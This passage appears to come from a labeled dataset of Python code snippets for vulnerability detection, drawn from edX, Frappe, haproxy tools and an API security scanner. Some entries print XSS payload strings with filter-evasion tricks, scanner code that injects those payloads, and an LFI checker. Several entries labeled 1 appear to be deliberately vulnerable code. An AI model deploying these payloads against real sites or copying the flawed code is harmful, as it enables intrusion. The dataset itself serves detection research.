-when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def", "label": 0}, {"snippet_id": 38984, "code": "=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue", "label": 0}, {"snippet_id": 25897, "code": "('TIME_INPUT_FORMATS')), ) elif q.type==Question.TYPE_DATETIME: field=SplitDateTimeField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).astimezone", "label": 0}, {"snippet_id": 50156, "code": "(self): \"\"\" Called when this session gets authenticated by the server. \"\"\" pass def lineSend(self, csessid, data): \"\"\" This adds the data to the buffer and/or sends it to the client as soon as possible", "label": 0}, {"snippet_id": 42358, "code": "\"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self", "label": 0}, {"snippet_id": 29494, "code": ": \t\t\treturn False \tssh.close() \t\t def show_log(stdout): \ti=0 \tfor line in stdout: \t\ti=i +1 \t\tline_class=\"line3\" if i % 2==0 else \"line\" \t\tprint('<div class=\"'+line_class+'\">' +escape_html(line) +'</div", "label": 0}, {"snippet_id": 28649, "code": ".get('uuid') \tref=os.environ.get(\"SCRIPT_NAME\") \tsql.delete_old_uuid() \t \tif user_uuid is not None: \t\tsql.update_last_act_user(user_uuid.value) \t\tif sql.get_user_name_by_uuid(user_uuid.value) is None: ", "label": 0}, {"snippet_id": 9840, "code": " url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>", "label": 0}, {"snippet_id": 31585, "code": ".Timedelta(hours=1) \t\tx_max=df.index.max() +pd.Timedelta(minutes=1) \t\tp[serv]=figure( \t\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\", \t\t\ttitle=metric[0][0], \t\t\tx_axis_type=\"datetime\", y_axis_label='Connections", "label": 0}, {"snippet_id": 15581, "code": " not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running", "label": 0}, {"snippet_id": 51902, "code": " CELERY_ACCEPT_CONTENT=['pickle'] CELERY_TASK_SERIALIZER='pickle' CELERY_RESULT_SERIALIZER='pickle' CELERY_TIMEZONE='UTC' CELERY_BEAT_SCHEDULER='django_celery_beat.schedulers:DatabaseScheduler' CELERY_BROKER_CONNECTION_MAX_RETRIES", "label": 0}, {"snippet_id": 31599, "code": ",xwheel_zoom\", \t\t\ttitle=metric[0][0], \t\t\tx_axis_type=\"datetime\", y_axis_label='Connections', \t\t\tx_range=(x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000) \t\t\t) \t\t\t \t\thover=HoverTool( \t\t\ttooltips=[ \t\t\t\t", "label": 0}, {"snippet_id": 23819, "code": "'tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name=", "label": 0}, {"snippet_id": 5717, "code": "=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>', '<scriscriptpt>alert(/xss/)</scriscriptpt", "label": 0}, {"snippet_id": 2382, "code": " vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers", "label": 0}, {"snippet_id": 15605, "code": " def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in them. For example, if the course is located in", "label": 0}, {"snippet_id": 6083, "code": "'en', 'base_url': None, 'default_eppn_scope': None, 'authn_info_mongo_uri': None, 'max_authn_failures_per_month': '50', 'login_state_ttl': '5', 'default_scoped_affiliation': None, 'vccs_url': 'http://localhost", "label": 0}, {"snippet_id": 14966, "code": "): \"\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure", "label": 0}, {"snippet_id": 16627, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name", "label": 0}, {"snippet_id": 38259, "code": "\tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape", "label": 0}, {"snippet_id": 15554, "code": "(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"", "label": 0}, {"snippet_id": 23112, "code": ">[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems", "label": 0}, {"snippet_id": 9846, "code": " url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores", "label": 0}, {"snippet_id": 49099, "code": ".column_id in self.current_columns def is_reverse(self): for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if int(c)==self.column_id: if column.startswith(\"-\"): return True return False", "label": 0}, {"snippet_id": 15254, "code": " when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when", "label": 0}, {"snippet_id": 37073, "code": ".content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment'", "label": 0}, {"snippet_id": 2938, "code": "=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result", "label": 0}, {"snippet_id": 54729, "code": ".save(commit=False) a.author=self.request.user a.article=self.object a.save() return super().form_valid(form) def is_mobile(useragent): devices=[\"Android\", \"iPhone\", \"SymbianOS\", \"Windows Phone\", \"iPad\",", "label": 0}, {"snippet_id": 32791, "code": "\"FileContents-lineContents\">%(line)s</td></tr>') %{'num': i, 'quot': \"'\", 'line': line}) self.wfile.write('</table>') self._WriteTemplate('footer.html') def _DoCSS(self, template): self._WriteHeader('text", "label": 0}, {"snippet_id": 13008, "code": " url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE", "label": 0}, {"snippet_id": 41686, "code": "\t\traise ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes[doctype] class BaseDocument(object): \tignore_in_getter=(\"doctype\", \"_meta\", \"meta\", \"_table_fields", "label": 0}, {"snippet_id": 32678, "code": " for line in contents.splitlines() if(line.startswith(' not line.startswith(' md.treeprocessors['adjust_toc']=_AdjustTOC(has_a_single_h1) md_fragment=md.convert(contents).encode('utf-8') try: self._WriteHeader", "label": 0}, {"snippet_id": 8665, "code": "'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME", "label": 0}, {"snippet_id": 86, "code": "=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads", "label": 1}, {"snippet_id": 2179, "code": " impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request", "label": 0}, {"snippet_id": 47728, "code": " 6: return False if pw1.isupper(): return False if pw1.islower(): return False return True def recreate_form(reason: str): return redirect('/admin/users/edit?fault=' +str(reason)) def action_save_user(request", "label": 0}, {"snippet_id": 30729, "code": "\tsave_command='echo \"show servers state\" | sudo socat stdio %s > %s' %(haproxy_sock, server_state_file) \t\tcommand=[ cmd, save_command] \telse: \t\tcommand=[ cmd] \t\t \tif enable !=\"show\": \t\tprint('<center><h3", "label": 0}, {"snippet_id": 47429, "code": ".add_content(PlainText('<h3>Add new user</h3>')) if not profile: f.add_content(PlainText(\"username(can't be edited later on): \")) f.add_content(TextField(name='username')) if http_request.GET.get('fault')", "label": 0}, {"snippet_id": 10617, "code": " ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a", "label": 0}, {"snippet_id": 46424, "code": "'label']) Document.objects.link(dashboard_doc, owner=request.user, name=collection['name'], description=collection['label'], extra='search-dashboard') dashboard_doc.update_data({ 'collection': collection", "label": 0}, {"snippet_id": 40942, "code": ".utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe", "label": 1}, {"snippet_id": 41086, "code": "\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self", "label": 0}, {"snippet_id": 9594, "code": "'ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns ", "label": 0}, {"snippet_id": 28072, "code": ".render_json({'status': 'success'}) class LogoutHandler(base_handler.Handler): \"\"\"Log out handler.\"\"\" @handler.unsupported_on_local_server @handler.require_csrf_token @handler.get(handler.HTML) def get", "label": 0}, {"snippet_id": 16968, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 29067, "code": " tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\t \tos.system(\"rm -f %s\" % script) \tssh_command(serv, commands, print_out=\"1\") \t \tif kwargs.get('syn_flood')==\"1\": \t\tsyn_flood_protect(serv) ", "label": 0}, {"snippet_id": 37585, "code": "\t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog", "label": 0}, {"snippet_id": 29809, "code": "\t\tsys.exit() \tsys.exit() if form.getvalue('token') is None: \tprint(\"What the fuck?! U r hacker Oo?!\") \tsys.exit() \t\t if form.getvalue('getcerts') is not None and serv is not None: \tcert_path=sql.get_setting", "label": 0}, {"snippet_id": 32196, "code": " SocketServer import argparse import codecs import os import re import socket import sys import threading import time import webbrowser from xml.etree import ElementTree THIS_DIR=os.path.realpath(os.path", "label": 0}, {"snippet_id": 46938, "code": " del_comment(self, user_id, comment_id): c=await Comment.get(id=comment_id) if c and c.github_id==user_id and c.post_id==self.id: await c.delete() return True return False @property @cache(MC_KEY_COMMENT_LIST %(", "label": 0}, {"snippet_id": 4422, "code": " def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload +=", "label": 0}, {"snippet_id": 19766, "code": " execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted", "label": 0}, {"snippet_id": 26117, "code": "'required' del self.fields['company'].widget.attrs['data-display-dependency'] if 'vat_id' in self.fields: del self.fields['vat_id'].widget.attrs['data-display-dependency'] self.fields['name_parts']=NamePartsFormField", "label": 0}, {"snippet_id": 24670, "code": ".verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts", "label": 0}, {"snippet_id": 4677, "code": "', ] _events=[ 'onabort', 'onautocomplete', 'onautocompleteerror', 'onafterscriptexecute', 'onanimationend', 'onanimationiteration', 'onanimationstart', 'onbeforecopy', 'onbeforecut', 'onbeforeload', 'onbeforepaste", "label": 0}, {"snippet_id": 49720, "code": " flask import Flask, render_template, session,request,flash,redirect,url_for import sys if len(sys.argv)<3: print \"Usage: python jShell.py IpAddress Port\\nExample: python jsHell.py 192.168.0.1 8080\" exit", "label": 1}, {"snippet_id": 5714, "code": "&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>', '<scriscriptpt", "label": 0}, {"snippet_id": 13041, "code": ".index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user", "label": 0}, {"snippet_id": 54581, "code": ": \"\"\"\u6ce8\u518c\u9875\u9762\u3002\u4f7f\u7528\u7cfb\u7edf\u63d0\u4f9b\u7684\u521b\u5efa\u7528\u6237\u8868\u5355\u3002\"\"\" template_name='register.html' form_class=UserCreationForm success_url='/login/' def form_valid(self, form): \"\"\"\u6821\u9a8c\u6210\u529f\uff0c\u4fdd\u5b58\u7528\u6237\u3002\"\"\" form.save() return super().form_valid(form) class", "label": 0}, {"snippet_id": 19665, "code": ".imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir", "label": 0}, {"snippet_id": 54482, "code": " UserPassesTestMixin from django.core.paginator import EmptyPage, PageNotAnInteger, Paginator from django.http import HttpResponse from django.urls import reverse from django.template import RequestContext from django", "label": 0}, {"snippet_id": 41534, "code": "\t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post", "label": 0}, {"snippet_id": 15492, "code": "--noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for", "label": 0}, {"snippet_id": 35471, "code": "\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values", "label": 0}, {"snippet_id": 16631, "code": "/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg", "label": 0}, {"snippet_id": 47980, "code": " ntpath import os import math import PIL from PIL import Image PATH_TO_UPLOAD_FOLDER_ON_DISK: str=\"/usr/local/www/focweb/\" IMAGE_SCALE=64 def action_change_user_avatar(request: HttpRequest): try: user_id", "label": 0}, {"snippet_id": 3516, "code": " result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://", "label": 0}, {"snippet_id": 38188, "code": "(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)", "label": 0}, {"snippet_id": 47059, "code": " from sqlalchemy.exc import SQLAlchemyError from.api import Record from.models import RecordMetadata class RecordMetadataModelView(ModelView): \"\"\"Records admin model view.\"\"\" filter_converter=FilterConverter", "label": 0}, {"snippet_id": 21034, "code": ": urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern", "label": 0}, {"snippet_id": 30859, "code": "%(hap_configs_dir, left, hap_configs_dir, right)\t \tenv=Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"]) \ttemplate=env.get_template('compare", "label": 0}, {"snippet_id": 2471, "code": " res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8')", "label": 0}, {"snippet_id": 24146, "code": " command to run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher", "label": 0}, {"snippet_id": 41593, "code": ".model.db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype): \t\"\"\"Returns the **class** object of", "label": 0}, {"snippet_id": 48951, "code": ": display_function=getattr(self.object, 'get_%s_display' % self.column.field_name, False) value=display_function() if display_function else field return escape(value) def format(self, value): if isinstance", "label": 1}, {"snippet_id": 7549, "code": "<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P", "label": 0}, {"snippet_id": 51382, "code": " Django settings for dashboard project. Generated by 'django-admin startproject' using Django 2.1.7. For more information on this file, see https://docs.djangoproject.com/en/2.1/topics/settings/ For the full", "label": 0}, {"snippet_id": 33085, "code": " toc_aux=ElementTree.SubElement(toc_node, 'div',{'class': 'toc-aux'}) toc_aux.text='\\n' toc_aux.append(ul_with_the_desired_toc_entries) toc_aux.tail='\\n' if __name__=='__main__': sys.exit(main(sys.argv[1:]))", "label": 0}, {"snippet_id": 35057, "code": "\tdef db_update(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t", "label": 0}, {"snippet_id": 10581, "code": " import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib", "label": 0}, {"snippet_id": 44754, "code": " _property in properties])) if copied_properties: _properties.update(copied_properties) response['status']=0 response['properties']=_properties response['name']='%s-%s' %(node['widgetType'].split('-')[0", "label": 0}, {"snippet_id": 10140, "code": "'test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo", "label": 0}, {"snippet_id": 17945, "code": "'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}),", "label": 0}, {"snippet_id": 6790, "code": " @property def authn_info_mongo_uri(self): \"\"\" Authn info(failed logins etc.) MongoDB connection URI(string). See MongoDB documentation for details. If not set, Kantara authn logs will not be maintained", "label": 0}, {"snippet_id": 47254, "code": ") db.session.commit() with app.test_request_context(): index_view_url=url_for('recordmetadata.index_view') delete_view_url=url_for('recordmetadata.delete_view') detail_view_url=url_for( 'recordmetadata", "label": 1}, {"snippet_id": 39972, "code": "'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe", "label": 0}, {"snippet_id": 1130, "code": "+=','+key except: logs.logging.info(\"XSS: No GET param found!\") print \"all params\",vul_param def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers", "label": 1}, {"snippet_id": 3452, "code": " result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}", "label": 0}, {"snippet_id": 53482, "code": ".doc.get().can_read_or_exception(request.user) bundle_doc.dependencies=dependencies bundle_doc.update_data(bundle_data) bundle_doc.name=bundle_data['name'] bundle_doc.save() response['status']=0 response[", "label": 0}, {"snippet_id": 31639, "code": "=0 \t\tp[serv].y_range.end=int(df['conn'].max()) +150 \t\tp[serv].add_tools(hover) \t\tp[serv].title.text_font_size=\"20px\"\t\t\t\t \t\tp[serv].line(\"Date\", \"conn\", source=source, alpha=0.5, color=' \t\tp[serv].legend", "label": 0}, {"snippet_id": 26991, "code": " check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url): global lfi_attacks global lfi_expect global DEBUG if page.find(\"http://\")==0 or page.find(\"https://\")==0: furl", "label": 0}, {"snippet_id": 23500, "code": "'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r", "label": 0}, {"snippet_id": 5470, "code": "'onwaiting', 'onwebkitanimationend', 'onwebkitanimationiteration', 'onwebkitanimationstart', 'onwebkitfullscreenchange', 'onwebkitfullscreenerror', 'onwebkitkeyadded', 'onwebkitkeyerror', 'onwebkitkeymessage", "label": 0}, {"snippet_id": 28193, "code": "\t \terror=funct.get_config(serv, cfg) \t \ttry: \t\tconf=open(cfg, \"r\") \t\tconfig_read=conf.read() \t\tconf.close \texcept IOError: \t\terror +='<br />Can\\'t read import config file' \tos.system(\"/bin/mv %s %s.old", "label": 0}, {"snippet_id": 11434, "code": "(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains", "label": 0}, {"snippet_id": 29162, "code": " && \" +tmp_config_path+script +\" PROXY=\" +proxy+ \t\t\t\t\" HAPROXY_PATH=\"+haproxy_dir +\" VERSION=\"+ver] \t \terror=str(upload(serv, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \tos.system(\"rm", "label": 0}, {"snippet_id": 563, "code": "'application/json' or 'text/plain' in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid=None): xss_result='' xss_payloads", "label": 1}, {"snippet_id": 42153, "code": "\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]=", "label": 0}, {"snippet_id": 54114, "code": ",get=get,post=post,user_agent=user_agent.get(),fresh=fresh,cookie=ck) print(\"[*]Test was finished at:{}\\n[*]Duration:{} seconds\\n\".format(datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\"),int(time.time()-ti)))", "label": 0}, {"snippet_id": 44014, "code": "]) \t\t\t\telse: \t\t\t\t\tfval=(\"=\", fval) \t\t\t_filters[f]=fval \tfor d in data: \t\tadd=True \t\tfor f, fval in iteritems(_filters): \t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]): \t\t\t\tadd=False \t\t", "label": 0}, {"snippet_id": 49872, "code": "].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu') responses=[ \"send help\", \"what is my purpose\", \"donate to us via bitcoin at:{{ bitcoin_address}}\", \"donate to us via paypal at", "label": 1}, {"snippet_id": 47829, "code": "\"confirm_password\"]) mail=str(request.POST[\"email\"]) rights=int(request.POST[\"rights\"]) user: Profile=Profile.objects.get(pk=pid) user.displayName=displayname user.dect=dect user.notes=notes user.rights=rights user", "label": 1}, {"snippet_id": 23844, "code": "._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual(", "label": 0}, {"snippet_id": 46827, "code": " save(self, *args, **kwargs): content=kwargs.pop('content', None) if content is not None: await self.set_content(content) return await super().save(*args, **kwargs) @property async def content(self): rv", "label": 0}, {"snippet_id": 4512, "code": "(\"a\", \"\u03b1\", cnt) s=s.replace(\"e\", \"\u0435\", cnt) s=s.replace(\"a\", \"\u0430\", cnt) s=s.replace(\"e\", \"\u0451\", cnt) s=s.replace(\"o\", \"\u043e\", cnt) return s @staticmethod def fuzzErrorUnicode(s): return s +chr(random.randint(0xC2", "label": 0}, {"snippet_id": 46442, "code": "=dashboard_doc.doc.get() dashboard_doc.name=dashboard_doc1.name=collection['label'] dashboard_doc.description=dashboard_doc1.description=collection['description'] dashboard_doc.save() dashboard_doc1.save", "label": 0}, {"snippet_id": 18730, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns", "label": 0}, {"snippet_id": 25410, "code": " __init__(self, *args, **kwargs): fields=[] defaults={ 'widget': self.widget, 'max_length': kwargs.pop('max_length', None), } self.scheme_name=kwargs.pop('scheme') self.scheme=PERSON_NAME_SCHEMES.get(self", "label": 0}, {"snippet_id": 50133, "code": " in to_remove: sessions=self.sessionhandler.sessions_from_csessid(csessid) for sess in sessions: sess.disconnect() self.last_alive.pop(csessid, None) if not self.last_alive: self.keep_alive.stop() self", "label": 0}, {"snippet_id": 9069, "code": " url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\")", "label": 0}, {"snippet_id": 16438, "code": "'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" ", "label": 0}, {"snippet_id": 26007, "code": "'rows': 3}), 'company': forms.TextInput(attrs={'data-display-dependency': ' 'vat_id': forms.TextInput(attrs={'data-display-dependency': ' 'internal_reference': forms.TextInput, } labels={ 'is_business': ", "label": 0}, {"snippet_id": 41870, "code": "[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value,", "label": 0}, {"snippet_id": 28234, "code": " \t\tpass \t\t \tconfig=form.getvalue('config') \toldcfg=form.getvalue('oldconfig') \tsave=form.getvalue('save') \taftersave=1 \ttry: \t\twith open(cfg, \"a\") as conf: \t\t\tconf.write(config) \texcept IOError: \t\terror", "label": 0}, {"snippet_id": 8682, "code": " +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$", "label": 0}, {"snippet_id": 36458, "code": "): \t\treturn cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df in self", "label": 0}, {"snippet_id": 51999, "code": " import PopupException from desktop.lib.i18n import smart_str from desktop.lib.rest.http_client import RestException from desktop.models import Document, Document2 from liboozie.credentials import Credentials", "label": 0}, {"snippet_id": 38955, "code": "=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\", None): \t\t\tvalue.idx=len(self.get(key) or[]) +1 \t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal'", "label": 0}, {"snippet_id": 45291, "code": ".description, extra='coordinator2') if coordinator_data['properties']['workflow']: dependencies=Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow']) for doc", "label": 0}, {"snippet_id": 31450, "code": "\", source=source, alpha=0.5, color=' \t\tp[serv].line(\"Date\", \"curr_ssl_con\", source=source, alpha=0.5, color=\" \t\tp[serv].line(\"Date\", \"sess_rate\", source=source, alpha=0.5, color=\" \t\tp[serv].legend.orientation", "label": 0}, {"snippet_id": 15797, "code": "(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class 